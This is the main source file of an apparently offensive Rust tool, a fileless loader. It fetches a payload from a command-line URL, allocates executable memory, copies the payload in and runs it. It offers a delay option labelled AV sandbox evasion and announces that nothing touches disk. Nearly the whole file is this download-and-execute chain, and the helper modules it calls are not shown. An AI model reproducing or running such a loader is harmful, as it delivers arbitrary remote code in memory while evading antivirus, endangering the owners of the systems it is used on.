mod cli;
mod mem_alloc;
mod fetcher;
mod executor;

use anyhow::Result;
use clap::Parser;
use std::time::Duration;
use colored::Colorize;

fn main() -> Result<()> {
    // 1. Parse Args with clap
    let args = cli::Args::parse();

    // 2. Call print_banner(&args)
    cli::print_banner(&args);

    // 3. If args.delay > 0
    if args.delay > 0 {
        println!("{}", format!("[*] Sleeping {}ms — simulating AV sandbox evasion...", args.delay).cyan());
        std::thread::sleep(Duration::from_millis(args.delay));
    }

    // 4. Register Ctrl+C handler
    ctrlc::set_handler(move || {
        println!("{}", "\n[!] Interrupted — cleaning up...".red());
        std::process::exit(1);
    }).expect("Error setting Ctrl-C handler");

    // 5. Fetch payload
    let payload = fetcher::fetch_payload(&args.url, args.verbose)?;

    // 6. Hex dump
    if args.hex_dump {
        fetcher::hex_dump(&payload, 64);
    }

    // 7. Dry run report
    if args.dry_run {
        executor::dry_run_report(&payload);
        println!("{}", "[*] Dry run complete. Exiting.".cyan());
        return Ok(());
    }

    // 8. Allocate memory
    // size must be large enough to hold the payload. We ensure that args.size is at least payload.len()
    let alloc_size = std::cmp::max(args.size, payload.len());
    let ptr = mem_alloc::alloc_exec_memory(alloc_size, args.verbose)?;

    // 9. Print RAM only message
    println!("{}", "[*] No file written to disk. Payload lives in RAM only.".cyan());

    // 10. Copy payload to memory
    executor::copy_to_memory(ptr, &payload)?;

    // 11. Execute payload
    executor::execute_payload(ptr, args.verbose)?;

    // 12. Free memory
    mem_alloc::dealloc_exec_memory(ptr, alloc_size)?;

    // 13. Completion message
    println!("{}", "[✓] Operation complete. Disk footprint: 0 bytes.".green());

    Ok(())
}
